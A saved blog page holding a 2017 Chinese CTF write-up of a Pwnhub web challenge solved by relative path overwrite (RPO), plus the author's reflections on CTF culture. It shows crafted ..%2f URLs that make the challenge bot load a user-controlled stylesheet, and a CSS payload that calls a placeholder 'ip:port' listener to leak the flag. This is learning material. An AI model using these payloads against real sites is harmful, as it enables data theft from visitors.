<!DOCTYPE HTML>

<html>
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
<meta content="yes" name="apple-mobile-web-app-capable">
<title>Pwnhub-小m的修仙题-WP&amp;反思 - Veneno's Blog</title>
<link href="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
<![endif]-->
<meta content="这周pwnhub小m上了一个修仙题，其实是一个很有意思的点，造成了一个漏洞的产生，Get了一波:纵观整个页面，很容易让人以为是一个selfxss加csrf的题，但其实根本没有xss。首先扫一波目..." name="description">
<script type="text/javascript">
(function () {
    window.TypechoComment = {
        dom : function (id) {
            return document.getElementById(id);
        },
    
        create : function (tag, attr) {
            var el = document.createElement(tag);
        
            for (var key in attr) {
                el.setAttribute(key, attr[key]);
            }
        
            return el;
        },

        reply : function (cid, coid) {
            var comment = this.dom(cid), parent = comment.parentNode,
                response = this.dom('respond-post-324'), input = this.dom('comment-parent'),
                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
                textarea = response.getElementsByTagName('textarea')[0];

            if (null == input) {
                input = this.create('input', {
                    'type' : 'hidden',
                    'name' : 'parent',
                    'id'   : 'comment-parent'
                });

                form.appendChild(input);
            }

            input.setAttribute('value', coid);

            if (null == this.dom('comment-form-place-holder')) {
                var holder = this.create('div', {
                    'id' : 'comment-form-place-holder'
                });

                response.parentNode.insertBefore(holder, response);
            }

            comment.appendChild(response);
            this.dom('cancel-comment-reply-link').style.display = '';

            if (null != textarea && 'text' == textarea.name) {
                textarea.focus();
            }

            return false;
        },

        cancelReply : function () {
            var response = this.dom('respond-post-324'),
            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');

            if (null != input) {
                input.parentNode.removeChild(input);
            }

            if (null == holder) {
                return true;
            }

            this.dom('cancel-comment-reply-link').style.display = 'none';
            holder.parentNode.insertBefore(response, holder);
            return false;
        }
    };
})();
</script>
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        focus: 'focus',
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        focus: 'onfocus',
        load: 'onload'
    };

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-324');

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;

                if (null != textarea && 'text' == textarea.name) {
                    textarea[event.add](event.focus, function () {
                        if (!added) {
                            var input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = '_';
                            input.value = (function () {
    var _ona6 = 'cc'//'IRq'
+''///*'Q'*/'Q'
+//'H'
'2'+/* 'hg'//'hg' */''+//'Ok'
'1d7'+'16'//'m'
+'38'//'jgL'
+//'Cq'
'4a'+'c7f'//'WE'
+'244'//'M'
+'aF'//'aF'
+/* 'wtn'//'wtn' */''+//'Z'
'b'+//'p2'
'75'+''///*'VS'*/'VS'
+'e22'//'ZY'
+'300'//'D'
+//'xU'
'f'+//'7uY'
'3'+//'a'
'2ea', _UTP = [[18,20]];
    
    for (var i = 0; i < _UTP.length; i ++) {
        _ona6 = _ona6.substring(0, _UTP[i][0]) + _ona6.substring(_UTP[i][1]);
    }

    return _ona6;
})();

                            f.appendChild(input);
                            added = true;
                        }
                    });
                }
            }
        }
    });
})();
</script><link href="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/style.css" rel="stylesheet"/>
<link href="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/prism.css" rel="stylesheet"/>
<link href="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/iconfont.css" rel="stylesheet"/>
<link href="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/player.css" rel="stylesheet"/>
<link href="" rel="shortcut icon"/>
</meta></meta></head>
<body>
<header>
<div class="main">
<div class="intro"> <img class="intro-logo" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
      Veneno's Blog      </a></span> <span class="intro-siteinfo">
      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
<nav>
<div class="collapse">
<i class="iconfont icon-menu"></i></div>
<ul class="bar">
<li><a href="http://www.venenof.com/">首页</a></li>
<li><a href="http://www.venenof.com/index.php/archive.html">
          时间          </a></li>
<li><a href="http://www.venenof.com/index.php/link.html">
          友链          </a></li>
<li><a href="http://www.venenof.com/index.php/Veneno.html">
          About Me          </a></li>
</ul>
</nav>
<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
<div id="search" style="display:none">
<div class="icon-close" onclick="searchbox();"></div>
<form action="/index.php" class="search" id="searchform" method="get" name="form">
<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
</form>
</div>
</div></header><content>
<div class="main">
<div class="article">
<div class="article-title">Pwnhub-小m的修仙题-WP&amp;反思</div>
<small class="article-time">发表于： <time datetime="2017-03-27T10:14:00+00:00" itemprop="datePublished">2017-03-27</time> | 分类： <a href="http://www.venenof.com/index.php/category/CTF/">CTF</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a> | <a href="http://www.venenof.com/index.php/archives/324/#comments" itemprop="discussionUrl">评论：0 </a> | 阅读：797</small>
<div class="article-content">
<p>这周pwnhub小m上了一个修仙题，其实是一个很有意思的点，造成了一个漏洞的产生，Get了一波:</p>
<hr/>
<p>纵观整个页面，很容易让人以为是一个selfxss加csrf的题，但其实根本没有xss。<br/>
首先扫一波目录，一般来说，针对这种一看代码量其实不是很大的页面，我个人其实很反感用那些大型扫描工具去扫描，因为除了占用服务器资源，什么都发现不了，而且这是CTF，又不是pentest，个人感觉一些小巧的扫描工具就足够用了:</p>
<p><img alt="QQ截图20170327102701.png" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/2148779446.png"/></p>
<p>其实很容易发现，小m应该是rewrite了所有的页面请求。这个其实倒无所谓。</p>
<hr/>
<p>当时我第一天晚上看的时候，以为是xss，就在满页面找输入点，最后发现其实貌似没啥用。<br/>
中间也间间断断看了一段时间，没有啥思路，尽管自己当时已经很清楚，<code>../../classes.css</code>那个地方绝对有猫腻，可是自己实在没想出这一个看起来不关键的点，却造成了整个漏洞的产生。</p>
<ul>
<li>前期测试</li>
</ul>
<p>自己其实就差了一步，先随手注册一个用户。然后很轻易地就会发现在classes.php页面与其他页面不同，怎么突然变的那么丑233。其实在不知道这个漏洞的前提下，感觉我跟我火日大哥就差了一个地方，就是截图体现的地方:</p>
<p><img alt="QQ截图20170327103642.png" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/3488058869.png"/></p>
<p>我们会发现如果是多级目录的话，那么那个classes.css根本不会调用，因为其加载的css的<code>http://52.80.19.55/classes.php/2/classes.css</code>。<br/>
那么既然这样的话，是不是意味着，我们可以将这个css加载到user.php，在前期的测试过程中，我们基本可以确定study vow是一个可控点。<br/>
那么既然如果css可以加载到user页面，那么vow是否可以也被加载引用。</p>
<ul>
<li>服务器端与浏览器端的差异。</li>
</ul>
<p>在服务器中，如果<code>http://127.0.0.1/admin/test/../../1.php</code>代表的就是1.php，但是如果我们把<code>/</code>给换成<code>%2f</code>，那么浏览器会把他当做一个文件，而不是跳目录去请求。<br/>
<img alt="123.png" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/3953555008.png"/></p>
<ul>
<li>利用方式</li>
</ul>
<p>既然这样的话，如果我们提交给bot的是<code>http://52.80.19.55/user.php/48/../../classes.php</code>，bot本身这个浏览器相当于访问的就是classes.php，但是我们如果改成<code>http://52.80.19.55/user.php/48/..%2f..%2fclasses.php</code>，相当于访问的就是<code>..%2f..%2fclasses.php</code>这个文件，那么其相当于<code>http://52.80.19.55/user.php/48/..%2f..%2fclasses.php/../../classes.css</code>，但是这样显然是不行的。<br/>
而我们现在想让classes.css能够渲染加载user.php页面的可控点。<br/>
也就是如下：</p>
<pre><code class="language-php">http://52.80.19.55/user.php/48/1/..%2f..%2f..%2fclasses.php
服务器返回的内容是经过decode的，也就是相当于http://52.80.19.55/classes.php
而css却是:
http://52.80.19.55/user.php/48/1/..%2f..%2f..%2fclasses.php/../../classes.css
也就是相当于
调用的却是http://52.80.19.55/user.php/48/classes.css
</code></pre>
<p>而我们很容易发现小m在user页面的id都是经过int的，后面加不加classes.css的返回结果都是一样的，那么至此，classes.css已经可以控制。(即相当于小mbot调用的是我们自己的css</p>
<p>于是我们可以注册一个用户，vow处写一个css加载图片的即可：</p>
<pre><code class="language-php">{}*{backgorund-image:url('http://ip:port');}
</code></pre>
<p>然后nc一个port，flag在repose中<br/>
<img alt="12321.png" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/3387030363.png"/></p>
<hr/>
<p>赛后看了猫哥以及Seafood的wp，才知道这个漏洞还有个学名叫RPO。<br/>
具体的paper：<a href="http://blog.innerht.ml/rpo-gadgets/">Gooo</a></p>
<p>我们试下paper中的效果：<br/>
<img alt="123123.png" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/1844058696.png"/></p>
<hr/>
<h2>反思：</h2>
<p>看火日的wp时候，被我恺哥实力教育：<br/>
<img alt="1234.png" src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/1997043040.png"/><br/>
其实很多比赛，尤其打国外比赛更是这样，往往国外的比赛题目很新颖，紧跟技术的发展，不像国内一样。<br/>
我就举几个例子：</p>
<ul>
<li>1</li>
</ul>
<p>第一个例子是去年HITCON2016上orange的唯一的一道php代码审计题，其中的关键点我个人感觉反而是UTF-8字符集的问题，而这种东西往往不是我们日常用能够发现了，而这个点恰恰在猪猪侠的微博上曾经提到过，这就意味着我们不能去期待所有的东西都是我们会的，但是如果出现，能立马想到这个点我们是不是曾经遇到过。就像去年年末，跟柠檬师傅去厦大打比赛的时候，有一个web我们选择放弃，其实就是.svn的泄露，但是当时的经验基本上定格于seay法师的那个工具，而赛后跟小鹿交流，小鹿说他也是看了rr的微博知道，然后当时一句woc脱口而出，rr发的那个weibo自己明明也看过，虽然是几个月前，可是真到遇到的时候，自己却没有去想到。所以说有时候，看到记住与只是简单看到而已完全是两个level。</p>
<ul>
<li>2</li>
</ul>
<p>第二个例子是今年BKP2017的那个web签到提，那道题依旧是php的黑魔法，是几年前BKP的升级版，只不过这次改成了sha1，而这个比赛恰恰是在google公布碰撞sha1成功后的几天。所以说这才是真的紧跟发展。而不像是国内一些赛事，照抄别人题目不说，经常国外两三年的题目依旧搬过来，先不说能不能学到东西，但是起码对于参赛者是感受不到快乐的。<br/>
所以，我一直觉得Pwnhub是个真心好的平台，不论自己做不做得出，起码是真能学到东西，起码出题人是真的为了让大家学到东西去出题。<br/>
就像这次小m的修仙题，虽然题目整体有点懵逼，但是看了wp之后，确实感到很震惊，一个丝毫不起眼的点，却造成了这种危害。(我不会说我也打了3分23333</p>
<hr/>
<h2>关于CTF</h2>
<p>其实自己现在也可以勉强算作一个赛棍。一直以来，确实我要承认，CTF的确是一个网安技术爱好者的最快入门途径，没有之一。<br/>
但是CTF永远不是现实，如果只是拘泥于CTF，那么个人的水平永远不会有什么太大de成长，相反，如果你在入门后，在现实中汲取各种知识，那么CTF也不会太差，记忆最深刻还是画船0CTF做题时，说了一句：</p>
<blockquote>
<p>好歹我挖了一年的XSS啊</p>
</blockquote>
<p>我不得不承认，一年前，我俩认识的时候，他的js功力可能不算太强，但是现在很强。<br/>
所以说，CTF带给你的其实只是一个入门点。</p>
<ul>
<li>CTF对于我意味着什么：</li>
</ul>
<p>最近一次记忆犹新的就是0CTF，Marche147因为去了Pwn2Own，导致0CTF我们没人做pwn，要不然肯定也是前十。bird两天花了两个通宵做出了竭尽所能的四道pwn题目。而因为0CTF这次有一个高校排名，这就导致了国内一些人各种Py交易。其实个人很反感这种行为，甚至说感觉这种行为根本没有必要。就算你进了决赛，那又能怎么样，根本没理解到什么是CTF，CTF究竟意味着什么。<br/>
一些高校老师只知道自己的利益，以前说CTF是培养人才，现在看来，有几场又算是，只知道挖坑，比如LCTF的师傅们，真的心疼他们。<br/>
其实现在CTF对于我自己的意义，就只有三点：</p>
<blockquote>
<p>跟战队的队友聚一聚。<br/>
跟别的战队的一些朋友聚一聚。<br/>
成绩无所谓，只求学到新东西。</p>
</blockquote>
</div>
<div class="post-footer">
<div class=" post-tags">
<div class="tag"> 标签: none</div>
<div class="post-nav">
<li class="prev"><a href="http://www.venenof.com/index.php/archives/314/" title="0CTF-complicated xss">0CTF-complicated xss</a></li>
<li class="next">
<a href="http://www.venenof.com/index.php/archives/336/" title="NDH2017-Web-Writeup">NDH2017-Web-Writeup</a></li>
</div>
</div>
</div>
</div></div></content>
<div id="comments">
<!-- Duoshuo Comment BEGIN -->
<div class="ds-thread" data-author-key="1" data-thread-key="324" data-title="Pwnhub-小m的修仙题-WP&amp;反思" data-url=""></div>
<script type="text/javascript">
	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
	(function() {
		var ds = document.createElement("script");
		ds.type = "text/javascript";ds.async = true;
		ds.src = "http://static.duoshuo.com/embed.js";
		ds.charset = "UTF-8";
		(document.getElementsByTagName("head")[0] 
		|| document.getElementsByTagName("body")[0]).appendChild(ds);
	})();
	</script>
<!-- Duoshuo Comment END -->
</div>
</body></html>
﻿<div class="willerce">
<div> </div>
<!--播放器 -->
<div id="QPlayer">
<div id="pContent">
<div id="player"> <span class="cover"></span>
<div class="ctrl">
<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
<div class="progress">
<div class="timer left">0:00</div>
<div class="contr">
<div class="rewind icon"></div>
<div class="playback icon"></div>
<div class="fastforward icon"></div>
</div>
<div class="right">
<div class="liebiao icon"></div>
</div>
</div>
</div>
</div>
<div class="ssBtn">
<div class="adf"></div>
</div>
</div>
<ol id="playlist">
</ol>
</div>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/jquery.min.js"></script>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/jquery.marquee.min.js"></script>
<script>
	var	playlist = [	
];
  var isRotate = 1;
  var autoplay = ;  
</script>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/player.js"></script>
<script>
function bgChange(){
	var lis= $('.lib');
	for(var i=0; i<lis.length; i+=2)
	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
}
window.onload = bgChange;
</script>
<!--<div class="qrcode">
  <img src="" width="126" height="136" alt=""> </div>-->
<footer>
<p> <a href="" target="_blank">网站地图</a><br/>
Copyright © 2015-2017 <a href="http://www.venenof.com/">
    Veneno's Blog    
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
hs.fadeInOut = true;
hs.transitions = ["expand","crossfade"];
hs.lang.creditsText = "&copy; www.venenof.com";
hs.lang.creditsTitle = "&copy; www.venenof.com";
hs.creditsHref = "http://www.venenof.com/index.php";
hs.creditsPosition = "top left";
hs.lang={
loadingText : "载入中...",
loadingTitle : "取消",
closeText : "关闭",
closeTitle : "关闭 (Esc)",
previousText : "上一张",
previousTitle : "上一张 (←键)",
nextText : "下一张",
nextTitle : "下一张 (→键)",
moveTitle : "移动",
moveText : "移动",
playText : "播放",
playTitle : "幻灯播放 (空格键)",
pauseText : "暂停",
pauseTitle : "幻灯暂停 (空格键)",
number : "第%1张 共%2张",
restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
fullExpandTitle : "完整尺寸",
fullExpandText :  "原大"
};
//]]>
</script>
<script>
document.body.addEventListener('copy', function (e) {
    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
        setClipboardText(e);
    }
}); 
function setClipboardText(event) {
    var clipboardData = event.clipboardData || window.clipboardData;
    if (clipboardData) {
        event.preventDefault();
        var htmlData = ''
            + '著作权归作者所有。<br>'
            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
            + '作者：Veneno<br>'
            + '链接：' + window.location.href + '<br>'
            + '来源：http://www.venenof.com/<br><br>'
            + window.getSelection().toString();
        var textData = ''
            + '著作权归作者所有。\n'
            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
            + '作者：Veneno\n'
            + '链接：' + window.location.href + '\n'
            + '来源：http://www.venenof.com/\n\n'
            + window.getSelection().toString();
        clipboardData.setData('text/html', htmlData);
        clipboardData.setData('text/plain',textData);
    }
}
</script>
</a></p></footer>
<div class="toTop">TOP</div>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/all.js"></script>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/jquery.js"></script>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/prism.js"></script>
<script src="./Pwnhub-小m的修仙题-WP&amp;amp;反思 - Veneno's Blog/search.js"></script>
</div>

